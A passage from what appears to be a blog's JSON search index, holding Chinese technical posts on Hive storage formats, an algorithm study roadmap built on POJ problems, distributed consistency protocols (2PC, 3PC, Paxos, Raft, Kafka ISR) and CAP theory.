DISABLE NOVALIDATE Hive存储格式 存储格式 描述 STORED AS TEXTFILE 存储为纯文本文件。TEXTFILE是默认的文件格式，除非配置参数hive.default.fileformat有不同的设置.使用DELIMITED 子句来读取分隔的文件。通过使用“转义”子句(如“转义\\”)来转义分隔符字符如果您想使用能够包含这些分隔符字符的数据，那么就需要转义。还可以使用“NULL DEFINED AS”子句(默认为’\\N’)指定一个自定义的NULL格式。 STORED AS SEQUENCEFILE 存储为压缩的序列文件。 STORED AS ORC 存储为ORC文件格式。支持ACID事务和基于成本的优化器(CBO)。存储列级元数据。 STORED AS PARQUET STORED AS AVRO STORED AS RCFILE STORED BY 以非本地表格式存储。要创建或链接到一个非本地的表，例如一个由HBase或Druid或Accumulo的表支持的表.有关此选项的更多信息，请参见storagehandler。 INPUTFORMAT and OUTPUTFORMAT 在file_format中，指定相应的InputFormat和OutputFormat类的名称作为字符串文字。例如,“org.apache.hadoop.hive.contrib.fileformat.base64.Base64TextInputFormat。对于LZO压缩，使用的值是 INPUTFORMAT“com.hadoop.mapred.DeprecatedLzoTextInputFormat” OUTPUTFORMAT“org.apache.hadoop.hive.ql.io.HiveIgnoreKeyTextOutputFormat”(见LZO压缩)。 行格式化 格式 描述 RegEx ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.RegexSerDe’ WITH SERDEPROPERTIES(“input.regex” = ““) STORED AS TEXTFILE; 存储为纯文本文件，由正则表达式翻译。下面的例子在默认的Apache Weblog格式中定义了一个表。CREATE TABLE apachelog (host STRING,identity STRING,user STRING,time STRING,request STRING,status STRING,size STRING,referer STRING,agent STRING)ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.RegexSerDe’WITH SERDEPROPERTIES (“input.regex” = “() () (*) (- \\\\\\]*\\\\) (","updated":"2020-07-19T00:23:27.962Z","tags":[{"name":"hive","slug":"hive","permalink":"http://xwolf191.github.io/tags/hive/"}]},{"title":"C经典入门","date":"2018-01-11T02:00:00.000Z","path":"2018/01/11/C/C经典入门/","text":"https://www.zhihu.com/question/23844552/answer/25926376 学的不够 初期:一.基本算法: (1)枚举. (poj1753,poj2965) (2)贪心(poj1328,poj2109,poj2586) (3)递归和分治法. (4)递推. (5)构造法.(poj3295) (6)模拟法.(poj1068,poj2632,poj1573,poj2993,poj2996) 二.图算法: (1)图的深度优先遍历和广度优先遍历. (2)最短路径算法(dijkstra,bellman-ford,floyd,heap+dijkstra) (poj1860,poj3259,poj1062,poj2253,poj1125,poj2240) (3)最小生成树算法(prim,kruskal) (poj1789,poj2485,poj1258,poj3026) (4)拓扑排序 (poj1094) (5)二分图的最大匹配 (匈牙利算法) (poj3041,poj3020) (6)最大流的增广路算法(KM算法). (poj1459,poj3436) 三.数据结构. (1)串 (poj1035,poj3080,poj1936) (2)排序(快排、归并排(与逆序数有关)、堆排) (poj2388,poj2299) (3)简单并查集的应用. (4)哈希表和二分查找等高效查找法(数的Hash,串的Hash)(poj3349,poj3274,POJ2151,poj1840,poj2002,poj2503) (5)哈夫曼树(poj3253) (6)堆 (7)trie树(静态建树、动态建树) (poj2513) 四.简单搜索 (1)深度优先搜索 (poj2488,poj3083,poj3009,poj1321,poj2251) (2)广度优先搜索(poj3278,poj1426,poj3126,poj3087.poj3414) (3)简单搜索技巧和剪枝(poj2531,poj1416,poj2676,1129) 五.动态规划 (1)背包问题. (poj1837,poj1276) (2)型如下表的简单DP(可参考lrj的书 page149):1.E[j]=opt{D[i]+w(i,j)} (poj3267,poj1836,poj1260,poj2533)2.E[i,j]=opt{D[i-1,j]+xi,D[i,j-1]+yj,D[i-1][j-1]+zij} (最长公共子序列)(poj3176,poj1080,poj1159)3.C[i,j]=w[i,j]+opt{C[i,k-1]+C[k,j]}.(最优二分检索树问题) 六.数学 (1)组合数学:1.加法原理和乘法原理.2.排列组合.3.递推关系.(POJ3252,poj1850,poj1019,poj1942) (2)数论.1.素数与整除问题2.进制位.3.同余模运算.(poj2635, poj3292,poj1845,poj2115) (3)计算方法.1.二分法求解单调函数相关知识.(poj3273,poj3258,poj1905,poj3122) 七.计算几何学. (1)几何公式. (2)叉积和点积的运用(如线段相交的判定,点到线段的距离等). (poj2031,poj1039) (3)多边型的简单算法(求面积)和相关判定(点在多边型内,多边型是否相交)(poj1408,poj1584) (4)凸包. (poj2187,poj1113) 中级:一.基本算法: (1)C++的标准模版库的应用. (poj3096,poj3007) (2)较为复杂的模拟题的训练(poj3393,poj1472,poj3371,poj1027,poj2706) 二.图算法: (1)差分约束系统的建立和求解. (poj1201,poj2983) (2)最小费用最大流(poj2516,poj2516,poj2195) (3)双连通分量(poj2942) (4)强连通分支及其缩点.(poj2186) (5)图的割边和割点(poj3352) (6)最小割模型、网络流规约(poj3308, ) 三.数据结构. (1)线段树. (poj2528,poj2828,poj2777,poj2886,poj2750) (2)静态二叉检索树. (poj2482,poj2352) (3)树状树组(poj1195,poj3321) (4)RMQ. (poj3264,poj3368) (5)并查集的高级应用. (poj1703,2492) (6)KMP算法. (poj1961,poj2406) 四.搜索 (1)最优化剪枝和可行性剪枝 (2)搜索的技巧和优化 (poj3411,poj1724) (3)记忆化搜索(poj3373,poj1691) 五.动态规划 (1)较为复杂的动态规划(如动态规划解特别的施行商问题等) (poj1191,poj1054,poj3280,poj2029,poj2948,poj1925,poj3034) (2)记录状态的动态规划. (POJ3254,poj2411,poj1185) (3)树型动态规划(poj2057,poj1947,poj2486,poj3140) 六.数学 (1)组合数学:1.容斥原理.2.抽屉原理.3.置换群与Polya定理(poj1286,poj2409,poj3270,poj1026).4.递推关系和母函数. (2)数学.1.高斯消元法(poj2947,poj1487, poj2065,poj1166,poj1222)2.概率问题. (poj3071,poj3440)3.GCD、扩展的欧几里德(中国剩余定理) (poj3101) (3)计算方法.1.0/1分数规划. (poj2976)2.三分法求解单峰(单谷)的极值.3.矩阵法(poj3150,poj3422,poj3070)4.迭代逼近(poj3301) (4)随机化算法(poj3318,poj2454) (5)杂题. (poj1870,poj3296,poj3286,poj1095) 七.计算几何学. (1)坐标离散化. (2)扫描线算法(例如求矩形的面积和周长并,常和线段树或堆一起使用). (poj1765,poj1177,poj1151,poj3277,poj2280,poj3004) (3)多边形的内核(半平面交)(poj3130,poj3335) (4)几何工具的综合应用.(poj1819,poj1066,poj2043,poj3227,poj2165,poj3429) 高级:一.基本算法要求: (1)代码快速写成,精简但不失风格 (poj2525,poj1684,poj1421,poj1048,poj2050,poj3306) (2)保证正确性和高效性. poj3434 二.图算法: (1)度限制最小生成树和第K最短路. (poj1639) (2)最短路,最小生成树,二分图,最大流问题的相关理论(主要是模型建立和求解)(poj3155, poj2112,poj1966,poj3281,poj1087,poj2289,poj3216,poj2446 (3)最优比率生成树. (poj2728) (4)最小树形图(poj3164) (5)次小生成树. (6)无向图、有向图的最小环 三.数据结构. (1)trie图的建立和应用. (poj2778) (2)LCA和RMQ问题(LCA(最近公共祖先问题)有离线算法(并查集+dfs)和在线算法(RMQ+dfs)).(poj1330) (3)双端队列和它的应用(维护一个单调的队列,常常在动态规划中起到优化状态转移的目的). (poj2823) (4)左偏树(可合并堆). (5)后缀树(非常有用的数据结构,也是赛区考题的热点). (poj3415,poj3294) 四.搜索 (1)较麻烦的搜索题目训练(poj1069,poj3322,poj1475,poj1924,poj2049,poj3426) (2)广搜的状态优化:利用M进制数存储状态、转化为串用hash表判重、按位压缩存储状态、双向广搜、A*算法. (poj1768,poj1184,poj1872,poj1324,poj2046,poj1482) (3)深搜的优化:尽量用位运算、一定要加剪枝、函数参数尽可能少、层数不易过大、可以考虑双向搜索或者是轮换搜索、IDA*算法. (poj3131,poj2870,poj2286) 五.动态规划 (1)需要用数据结构优化的动态规划. (poj2754,poj3378,poj3017) (2)四边形不等式理论. (3)较难的状态DP(poj3133) 六.数学 (1)组合数学.1.MoBius反演(poj2888,poj2154)2.偏序关系理论. (2)博奕论.1.极大极小过程(poj3317,poj1085)2.Nim问题. 七.计算几何学. (1)半平面求交(poj3384,poj2540) (2)可视图的建立(poj2966) (3)点集最小圆覆盖. (4)对踵点(poj2079) 八.综合题. (poj3109,poj1478,poj1462,poj2729,poj2048,poj3336,poj3315,poj2148,poj1263) 1.不完全状态记录青蛙过河问题利用区间dp 2.背包类问题 0-1背包，经典问题无限背包，经典问题判定性背包问题带附属关系的背包问题 + -1背包问题双背包求最优值构造三角形问题带上下界限制的背包问题(012背包) 3.线性的动态规划问题积木游戏问题决斗（判定性问题）圆的最大多边形问题统计单词个数问题棋盘分割日程安排问题最小逼近问题(求出两数之比最接近某数/两数之和等于某数等等)方块消除游戏(某区间可以连续消去求最大效益)资源分配问题数字三角形问题漂亮的打印邮局问题与构造答案最高积木问题两段连续和最大2次幂和问题N个数的最大M段子段和交叉最大数问题 4.判定性问题的dp(如判定整除、判定可达性等)模K问题的dp特殊的模K问题，求最大(最小)模K的数变换数问题 5.单调性优化的动态规划1-SUM问题2-SUM问题序列划分问题(单调队列优化) 6.剖分问题(多边形剖分/石子合并/圆的剖分/乘积最大)凸多边形的三角剖分问题乘积最大问题多边形游戏(多边形边上是操作符,顶点有权值)石子合并(N^3/N^2/NLogN各种优化) 7.贪心的动态规划最优装载问题部分背包问题乘船问题贪心策略双机调度问题Johnson算法 8.状态dp牛仔射击问题(博弈类)哈密顿路径的状态dp两支点天平平衡问题一个有向图的最接近二部图 9.树型dp 完美服务器问题(每个节点有3种状态) 小胖守皇宫问题 网络收费问题 树中漫游问题 转自:学会了 C 语言真的可以开发出很多东西吗？","updated":"2020-07-19T00:23:27.773Z","tags":[{"name":"C","slug":"C","permalink":"http://xwolf191.github.io/tags/C/"}]},{"title":"分布式一致性协议","date":"2017-12-21T08:00:00.000Z","path":"2017/12/21/distributed/分布式一致性协议/","text":"本文主要讲述2PC及3PC，以及Paxos以及Raft协议。 两类一致性(操作原子性与副本一致性)2PC协议用于保证属于多个数据分片上的操作的原子性。这些数据分片可能分布在不同的服务器上，2PC协议保证多台服务器上的操作要么全部成功，要么全部失败。Paxos协议用于保证同一个数据分片的多个副本之间的数据一致性。当这些副本分布到不同的数据中心时，这个需求尤其强烈。 一、2PC（阻塞、数据不一致问题、单点问题） Two-Phase Commit，两阶段提交 阶段一：提交事务请求（投票阶段） （1）事务询问 协调者向所有的参与者发送事务内容，询问是否可以执行事务提交操作，并开始等待各参与者的响应 （2）执行事务 各参与者节点执行事务操作，并将Undo和Redo信息计入事务日志中 （3）各参与者向协调者反馈事务询问的响应 如果参与者成功执行了事务操作，那么就反馈给协调者Yes响应，表示事务可以执行；如果参与者没有成功执行事务，那么就反馈给协调者No响应，表示事务不可以执行。 阶段二：执行事务提交（执行阶段） （1）执行事务提交 如果所有参与者的反馈都是Yes响应，那么A、发送提交请求协调者向所有参与者节点发出Commit请求B、事务提交参与者接收到Commit请求后，会正式执行事务提交操作，并在完成提交之后释放在整个事务执行期间占用的事务资源C、反馈事务提交结果参与者在完成事务提交之后，向协调者发送ACK信息D、完成事务 协调者接收到所有参与者反馈的ACK消息后，完成事务。 （2）中断事务 任何一个参与者反馈了No响应，或者在等待超时之后，协调者尚无法接收到所有参与者的反馈响应，那么就会中断事务。A、发送回滚请求协调者向所有参与者节点发出Rollback请求B、事务回滚参与者接收到rollback请求后，会利用其在阶段一中记录的Undo信息来执行事务回滚操作，并在完成回滚之后释放整个事务执行期间占用的资源C、反馈事务回滚结果参与者在完成事务回滚之后，向协调者发送ACK信息D、中断事务 协调者接收到所有参与者反馈的ACK信息后，完成事务中断 优缺点 优点：原理简单、实现方便缺点：同步阻塞、单点问题、数据不一致、太过保守（1）同步阻塞同步阻塞会极大地限制分布式系统的性能。在二阶段提交的执行过程中，所有参与该事务操作的逻辑都处于阻塞状态，各个参与者在等待其他参与者响应的过程中，将无法进行其他任何操作。（2）单点问题一旦协调者出现问题，那么整个二阶段提交流程将无法运转，更为严重的是，如果是在阶段二中出现问题，那么其他参与者将会一直处于锁定事务资源的状态中，无法继续完成事务操作。（3）数据不一致在阶段二，当协调者向所有参与者发送commit请求之后，发生了局部网络异常或协调者在尚未发完commit请求之前自身发生了崩溃，导致最终只有部分参与者接收到了commit请求，于是这部分参与者执行事务提交，而没收到commit请求的参与者则无法进行事务提交，于是整个分布式系统出现了数据不一致性现象。（4）太过保守如果参与者在与协调者通信期间出现故障，协调者只能靠超时机制来判断是否需要中断事务，这个策略比较保守，需要更为完善的容错机制，任意一个节点的失败都会导致整个事务的失败。 二、3PC（解决2PC的阻塞，但还是可能造成数据不一致） Three-Phase Commit，三阶段提交，分为CanCommit、PreCommit、do Commit三个阶段。 为了避免在通知所有参与者提交事务时，其中一个参与者crash不一致时，就出现了三阶段提交的方式。三阶段提交在两阶段提交的基础上增加了一个preCommit的过程，当所有参与者收到preCommit后，并不执行动作，直到收到commit或超过一定时间后才完成操作。 阶段一、CanCommit （1）事务询问协调者向各参与者发送CanCommit的请求，询问是否可以执行事务提交操作，并开始等待各参与者的响应 （2）参与者向协调者反馈询问的响应参与者收到CanCommit请求后，正常情况下，如果自身认为可以顺利执行事务，那么会反馈Yes响应，并进入预备状态，否则反馈No。 阶段二、PreCommit （1）执行事务预提交如果协调者接收到各参与者反馈都是Yes，那么执行事务预提交 A、发送预提交请求协调者向各参与者发送preCommit请求，并进入prepared阶段 B、事务预提交参与者接收到preCommit请求后，会执行事务操作，并将Undo和Redo信息记录到事务日记中 C、各参与者向协调者反馈事务执行的响应如果各参与者都成功执行了事务操作，那么反馈给协调者Ack响应，同时等待最终指令，提交commit或者终止abort（2）中断事务 如果任何一个参与者向协调者反馈了No响应，或者在等待超时后，协调者无法接收到所有参与者的反馈，那么就会中断事务。 A、发送中断请求 协调者向所有参与者发送abort请求B、中断事务 无论是收到来自协调者的abort请求，还是等待超时，参与者都中断事务 阶段三、doCommit （1）执行提交 A、发送提交请求假设协调者正常工作，接收到了所有参与者的ack响应，那么它将从预提交阶段进入提交状态，并向所有参与者发送doCommit请求B、事务提交参与者收到doCommit请求后，正式提交事务，并在完成事务提交后释放占用的资源C、反馈事务提交结果参与者完成事务提交后，向协调者发送ACK信息D、完成事务协调者接收到所有参与者ack信息，完成事务 （2）中断事务 假设协调者正常工作，并且有任一参与者反馈No，或者在等待超时后无法接收所有参与者的反馈，都会中断事务 A、发送中断请求协调者向所有参与者节点发送abort请求B、事务回滚参与者接收到abort请求后，利用undo日志执行事务回滚，并在完成事务回滚后释放占用的资源C、反馈事务回滚结果参与者在完成事务回滚之后，向协调者发送ack信息D、中断事务协调者接收到所有参与者反馈的ack信息后，中断事务。阶段三可能出现的问题：协调者出现问题、协调者与参与者之间网络出现故障。不论出现哪种情况，最终都会导致参与者无法及时接收到来自协调者的doCommit或是abort请求，针对这种情况，参与者都会在等待超时后，继续进行事务提交（timeout后中断事务）。 优点：降低参与者阻塞范围，并能够在出现单点故障后继续达成一致缺点：引入preCommit阶段，在这个阶段如果出现网络分区，协调者无法与参与者正常通信，参与者依然会进行事务提交，造成数据不一致。 三、Paxos（解决单点问题）Paxos简介 Paxos算法是莱斯利·兰伯特（英语：Leslie Lamport，LaTeX中的“La”）于1990年提出的一种基于消息传递且具有高度容错特性的一致性算法。 拜占庭将军问题（Byzantine Generals Problem),是由莱斯利·兰波特在其同名论文中提出的分布式对等网络通信容错问题。在分布式计算中，不同的计算机通过通讯交换信息达成共识而按照同一套协作策略行动。但有时候，系统中的成员计算机可能出错而发送错误的信息，用于传递信息的通讯网络也可能导致信息损坏，使得网络中不同的成员关于全体协作的策略得出不同结论，从而破坏系统一致性。拜占庭将军问题被认为是容错性问题中最难的问题类型之一。 莱斯利·兰波特在其论文中描述了如下问题：一组拜占庭将军分别各率领一支军队共同围困一座城市。为了简化问题，将各支军队的行动策略限定为进攻或撤离两种。因为部分军队进攻部分军队撤离可能会造成灾难性后果，因此各位将军必须通过投票来达成一致策略，即所有军队一起进攻或所有军队一起撤离。因为各位将军分处城市不同方向，他们只能通过信使互相联系。在投票过程中每位将军都将自己投票给进攻还是撤退的信息通过信使分别通知其他所有将军，这样一来每位将军根据自己的投票和其他所有将军送来的信息就可以知道共同的投票结果而决定行动策略。系统的问题在于，将军中可能出现叛徒，他们不仅可能向较为糟糕的策略投票，还可能选择性地发送投票信息。假设有9位将军投票，其中1名叛徒。8名忠诚的将军中出现了4人投进攻，4人投撤离的情况。这时候叛徒可能故意给4名投进攻的将领送信表示投票进攻，而给4名投撤离的将领送信表示投撤离。这样一来在4名投进攻的将领看来，投票结果是5人投进攻，从而发起进攻；而在4名投撤离的将军看来则是5人投撤离。这样各支军队的一致协同就遭到了破坏。由于将军之间需要通过信使通讯，叛变将军可能通过伪造信件来以其他将军的身份发送假投票。而即使在保证所有将军忠诚的情况下，也不能排除信使被敌人截杀，甚至被敌人间谍替换等情况。因此很难通过保证人员可靠性及通讯可靠性来解决问题。假始那些忠诚（或是没有出错）的将军仍然能通过多数决来决定他们的战略，便称达到了拜占庭容错。在此，票都会有一个默认值，若消息（票）没有被收到，则使用此默认值来投票。上述的故事映射到计算机系统里，将军便成了计算机，而信差就是通信系统。虽然上述的问题涉及了电子化的决策支持与信息安全，却没办法单纯的用密码学与数字签名来解决。因为不正常的电压仍可能影响整个加密过程，这不是密码学与数字签名算法在解决的问题。因此计算机就有可能将错误的结果提交去，亦可能导致错误的决策。 分布式系统中的节点通信存在两种模型：共享内存（Shared memory）和消息传递（Messages passing）。基于消息传递通信模型的分布式系统，不可避免的会发生以下错误：进程可能会慢、被杀死或者重启，消息可能会延迟、丢失、重复，在基础Paxos场景中，先不考虑可能出现消息篡改即拜占庭错误的情况。Paxos算法解决的问题是在一个可能发生上述异常的分布式系统中如何就某个值达成一致，保证不论发生以上任何异常，都不会破坏决议的一致性。一个典型的场景是，在一个分布式数据库系统中，如果各节点的初始状态一致，每个节点都执行相同的操作序列，那么他们最后能得到一个一致的状态。为保证每个节点执行相同的命令序列，需要在每一条指令上执行一个“一致性算法”以保证每个节点看到的指令一致。一个通用的一致性算法可以应用在许多场景中，是分布式计算中的重要问题。因此从20世纪80年代起对于一致性算法的研究就没有停止过。为描述Paxos算法,Lamport虚拟了一个叫做Paxos的希腊城邦,这个岛按照议会民主制的政治模式制订法律,但是没有人愿意将自己的全部时间和精力放在这种事情上.所以无论是议员,议长或者传递纸条的服务员都不能承诺别人需要时一定会出现，也无法承诺批准决议或者传递消息的时间。但是这里假设没有拜占庭将军问题（Byzantine failure，即虽然有可能一个消息被传递了两次，但是绝对不会出现错误的消息）；只要等待足够的时间,消息就会被传到。另外，Paxos岛上的议员是不会反对其他议员提出的决议的。对应于分布式系统,议员对应于各个节点,制定的法律对应于系统的状态.各个节点需要进入一个一致的状态,例如在独立Cache的对称多处理器系统中,各个处理器读内存的某个字节时,必须读到同样的一个值,否则系统就违背了一致性的要求.一致性要求对应于法律条文只能有一个版本.议员和服务员的不确定性对应于节点和消息传递通道的不可靠性. Paxos推导 一致性的要求如下： 1.决议（value）只有在被proposers提出后才能被批准（未经批准的决议称为“提案（proposal）”）； 2.在一次Paxos算法的执行实例中，只批准（chosen）一个value； 3.learners只能获得被批准（chosen）的value。 Paxos算法把参与者分成三个角色：Proposers,Acceptors,Learners（注：允许一个参与者扮演多个角色）。Proposers会发出预提案（prepare request, proposal number），提出提案(accept request proposal, proposal)。Acceptor可以回复（respond）预提案，可以接受提案。当提案获得多数acceptors接受后，则该提案被批准（chosen)。Learner可以‘学习’被批准的提案。 如果只有一个Acceptors,它收到的第一个提案就作为选定的提案。这样虽然简单,但是如果这一个Acceptor挂掉,整个系统就不能用了。如下图所示:因此需要有多个Acceptors来接收提案，来避免Acceptors单点问题。 批准value的过程中，首先proposers将value发送给acceptors，之后acceptors对value进行接受（accept）。为了满足只批准一个value的约束，要求经“多数派（majority）”接受的value成为正式的决议（称为“批准”决议）。这是因为无论是按照人数还是按照权重划分，两组“多数派”至少有一个公共的acceptor，如果每个acceptor只能接受一个value，约束2就能保证。于是产生了一个显而易见的新约束： P1：一个acceptor必须接受（accept）第一次收到的提案。 但是P1约束是不完备的。如果恰好一半acceptor接受的提案具有value A，另一半接受的提案具有value B，那么就无法形成多数派,无法批准任何一个value。如下图所示: 三个Proposer(P1,P2,P3)分别将各自不同的提案1，2，3发送给不同的Acceptors(A1,A2,A3),并且同时被Accetpors接受。但是没有一个提案是被多个Acceptos接受。虽然满足P1约束,但是却无法选定提案。 如下图所示,虽然有多个Acceptors接收多个提案,但当Acceptors A5 宕机后。提案1、2的批准者都是2(接收P1和P2提案的Acceptos的数量),因此也无法最终选举出提案。 因此,在P1的基础上再加上一个提案被选定需要半数以上的Acceptor批准的需求,暗示一个Acceptor必须能够批准不止一个提案。于是就有新的约束P2: P2：一旦一个具有value v的提案被批准（chosen），那么之后批准（chosen）的提案必须具有value v。 注：通过某种方法可以为每个提案分配一个编号，在提案之间建立一个全序关系，所谓“之后”都是指所有编号更大的提案。如果P1和P2都能够保证，那么约束2就能够保证。批准一个value意味着多个acceptor接受（accept）了该value.因此，可以对P2进行加强： P2a：一旦一个具有value v的提案被批准（chosen），那么之后任何acceptor再次接受（accept）的提案必须具有value v。 由于通信是异步的，P2a和P1会发生冲突。如果一个value被批准后，一个proposer和一个acceptor从休眠中苏醒，前者提出一个具有新的value的提案。根据P1，后者应当接受，根据P2a，则不应当接受，这中场景下P2a和P1有矛盾。于是需要换个思路，转而对proposer的行为进行约束： P2b：一旦一个具有value v的提案被批准（chosen），那么以后任何proposer提出的提案必须具有value v。 由于acceptor能接受的提案都必须由proposer提出，所以P2b蕴涵了P2a，是一个更强的约束。但是根据P2b难以提出实现手段。因此需要进一步加强P2b。假设一个编号为m的value v已经获得批准（chosen），来看看在什么情况下对任何编号为n（n&gt;m）的提案都含有value v。因为m已经获得批准（chosen），显然存在一个acceptors的多数派C，他们都接受（accept）了v。考虑到任何多数派都和C具有至少一个公共成员，可以找到一个蕴涵P2b的约束P2c： P2c：如果一个编号为n的提案具有value v，那么存在一个多数派，要么他们中所有人都没有接受（accept）编号小于n的任何提案，要么他们已经接受（accept）的所有编号小于n的提案中编号最大的那个提案具有value v。 可以用数学归纳法证明P2c蕴涵P2b：假设具有value v的提案m获得批准，当n=m+1时，采用反证法，假如提案n不具有value v，而是具有value w，根据P2c，则存在一个多数派S1，要么他们中没有人接受过编号小于n的任何提案，要么他们已经接受的所有编号小于n的提案中编号最大的那个提案是value w。由于S1和通过提案m时的多数派C之间至少有一个公共的acceptor，所以以上两个条件都不成立，导出矛盾从而推翻假设，证明了提案n必须具有value v；若（m+1）..（N-1）所有提案都具有value v，采用反证法，假如新提案N不具有value v，而是具有value w’,根据P2c，则存在一个多数派S2，要么他们没有接受过m..（N-1）中的任何提案，要么他们已经接受的所有编号小于N的提案中编号最大的那个提案是value w’。由于S2和通过m的多数派C之间至少有一个公共的acceptor，所以至少有一个acceptor曾经接受了m，从而也可以推出S2中已接受的所有编号小于n的提案中编号最大的那个提案的编号范围在m..（N-1）之间，而根据初始假设，m..（N-1）之间的所有提案都具有value v，所以S2中已接受的所有编号小于n的提案中编号最大的那个提案肯定具有value v，导出矛盾从而推翻新提案n不具有value v的假设。根据数学归纳法，我们证明了若满足P2c，则P2b一定满足。P2c是可以通过消息传递模型实现的。另外，引入了P2c后，也解决了前文提到的P1不完备的问题。 算法的内容要满足P2c的约束，proposer提出一个提案前，首先要和足以形成多数派的acceptors进行通信，获得他们进行的最近一次接受（accept）的提案（prepare过程），之后根据回收的信息决定这次提案的value，形成提案开始投票。当获得多数acceptors接受（accept）后，提案获得批准（chosen），由proposer将这个消息告知learner。这个简略的过程经过进一步细化后就形成了Paxos算法。 在一个paxos实例中，每个提案需要有不同的编号，且编号间要存在全序关系。可以用多种方法实现这一点，例如将序数和proposer的名字拼接起来。如何做到这一点不在Paxos算法讨论的范围之内。如果一个没有chosen过任何proposer提案的acceptor在prepare过程中回答了一个proposer针对提案n的问题，但是在开始对n进行投票前，又接受（accept）了编号小于n的另一个提案（例如n-1），如果n-1和n具有不同的value，这个投票就会违背P2c。因此在prepare过程中，acceptor进行的回答同时也应包含承诺：不会再接受（accept）编号小于n的提案。这是对P1的加强： P1a：当且仅当acceptor没有回应过编号大于n的prepare请求时，acceptor接受（accept）编号为n的提案。现在已经可以提出完整的算法了。 决议的提出与批准通过一个决议分为两个阶段： prepare阶段: proposer选择一个提案编号n并将prepare请求发送给acceptors中的一个多数派； acceptor收到prepare消息后，如果提案的编号大于它已经回复的所有prepare消息，则acceptor将自己上次接受的提案回复给proposer，并承诺不再回复小于n的提案； 批准阶段 当一个proposer收到了多数acceptors对prepare的回复后，就进入批准阶段。它要向回复prepare请求的acceptors发送accept请求，包括编号n和根据P2c决定的value（如果根据P2c没有已经接受的value，那么它可以自由决定value）。 在不违背自己向其他proposer的承诺的前提下，acceptor收到accept请求后即接受这个请求。 这个过程在任何时候中断都可以保证正确性。例如如果一个proposer发现已经有其他proposers提出了编号更高的提案，则有必要中断这个过程。因此为了优化，在上述prepare过程中，如果一个acceptor发现存在一个更高编号的提案，则需要通知proposer，提醒其中断这次提案。 关于活锁问题,通过选举主Proposer并且规定只能主proposer才能提出议案. 四、Raft算法 Raft 是一种用来管理日志复制的一致性算法。它和 Paxos 的性能和功能是一样的，但是它和 Paxos 的结构不一样；这使得 Raft 更容易理解并且更易于建立实际的系统。为了提高理解性，Raft 将一致性算法分为了几个部分，例如领导选取（leader selection），日志复制（log replication）和安全性（safety），同时它使用了更强的一致性来减少了必须需要考虑的状态。从用户学习的结果来看，Raft 比 Paxos 更容易学会。Raft 还包括了一种新的机制来使得动态改变集群成员，它使用重叠大多数（overlapping majorities）来保证安全。 五、ISR的机制(解决f容错的2f+1成本问题) Kafka并没有使用Zab或Paxos协议的多数投票机制来保证主备数据的一致性，而是提出了ISR的机制（In-Sync Replicas）的机制来保证数据一致性。 ISR认为对于2f+1个副本来说，多数投票机制要求最多只能允许f个副本发生故障，如果要支持2个副本的容错，则需要至少维持5个副本，对于消息系统的场景来说，效率太低。 ISR的运行机制如下：将所有次级副本数据分到两个集合，其中一个被称为ISR集合，这个集合备份数据的特点是即时和主副本数据保持一致，而另外一个集合的备份数据允许其消息队列落后于主副本的数据。在做主备切换时，只允许从ISR集合中选择主副本，只有ISR集合内所有备份都写成功才能认为这次写入操作成功。在具体实现时，kafka利用zookeeper来保持每个ISR集合的信息，当ISR集合内成员变化时，相关构件也便于通知。通过这种方式，如果设定ISR集合大小为f+1，那么可以最多允许f个副本故障，而对于多数投票机制来说，则需要2f+1个副本才能达到相同的容错性。 参考 拜占庭将军问题 Paxos) The Part-Time Parliament Raft 一致性算法论文译文 Kafka 几个实现细节","updated":"2020-07-19T00:23:27.846Z","tags":[{"name":"分布式","slug":"分布式","permalink":"http://xwolf191.github.io/tags/分布式/"}]},{"title":"分布式系统CAP和BASE理论","date":"2017-12-21T03:00:00.000Z","path":"2017/12/21/distributed/分布式系统CAP和BASE理论/","text":"随着互联网的发展,计算机系统也从集中式向分布式演变。 集中式和分布式系统比较集中式系统是指一台或多台计算机组成计算中心,系统所有的功能都由这个中心提供。集中式系统部署简单,但是有明显的单点问题,随着业务和数据量的增长,扩容也比较困难。 分布式系统是硬件或软件组成分布在不同的计算机网络上,彼此之间仅仅通过消息传递进行通信和协调的服务。在没有特殊约束的情况下,分布式系统有以下特征: 分布性 分布式系统中的各个系统在空间上都是随意的,可以分布在不同机柜、机房、城市、国家等。同时,系统的分布特性随时变化。 对等性 分布式系统中计算机是对等的,没有主从之分。既没有控制整个系统的主机,也没有被控制的从机。 并发性 在计算机网络中,程序运行过程中的并发操作很常见。比如分布式系统中的不同节点,公共操作一份公共资源。如何处理好分布式系统的并发操作也是分布式系统架构设计的一大挑战。 缺乏全局时钟 分布式系统中很难来区分事件执行的先后顺序，缺乏全局的时钟。 故障总会发生 分布式系统的各个节点都有可能发生故障。 分布式系统面临的各种问题 通信异常 由于硬件、软件等因素导致网络通信异常,从而导致分布式系统不可用。 网络分区 由于网络异常，导致节点之间的延时不断增大，导致整个分布式系统中部分服务瘫称为网络分区,俗称为“脑裂”。当出现脑裂问题时,小部分正常也服务节点也要维持整个分布式系统的数据一致性,这就成为分布式系统的架构设计的一大挑战。 三态 分布式系统中的节点请求和响应的状态分为三种：成功、失败和超时。 节点故障 分布式系统中的任一节点都有可能发生宕机或僵死现象。 CAP定理 一致性(Consistency)、可用性(Availability)和分区容忍性(Partitiontolerance)。CAP原理指的是，这三个要素最多只能同时实现两点，不可能三者兼顾。这是Brewer教授于2000年提出的，后人也论证了CAP理论的正确性。 一致性（Consistency） 在分布式环境中,一致性是指数据在多个副本之间是否能够保持一致的特性。在一致性的需求下，当一个系统在数据一致的状态下执行更新操作后，应该保证系统的数据仍然处于一致状态。 对于分布式的存储系统，一个数据往往会存在多份。简单的说，一致性会让客户对数据的修改操作（增/删/改）,要么在所有的数据副本（replica）全部成功，要么全部失败。即，修改操作对于一份数据的所有副本（整个系统）而言，是原子（atomic）的操作。如果一个存储系统可以保证一致性，那么则客户读写的数据完全可以保证是最新的。不会发生两个不同的客户端在不同的存储节点中读取到不同副本的情况。 可用性（Availability） 是指用户的一次操作必须在有限的时间内得到返回结果。如果超过有限时间,虽然返回了结果也认为不可用。 分区容忍性（Partition Tolerance） 如果你的存储系统只运行在一个节点上，要么系统整个崩溃，要么全部运行良好。一旦针对同一服务的存储系统分布到了多个节点后，整个存储系统就存在分区的可能性。比如，两个存储节点之间联通的网络断开（无论长时间或者短暂的），就形成了分区。一般来讲，为了提高服务质量，同一份数据放置在不同城市非常正常的。因此节点之间形成分区也很正常。Gilbert 和Lynch将分区容忍性定义如下：除全部网络节点全部故障以外，所有子节点集合的故障都不允许导致整个系统不正确响应。即使部分的组件不可用，施加的操作也可以完成。 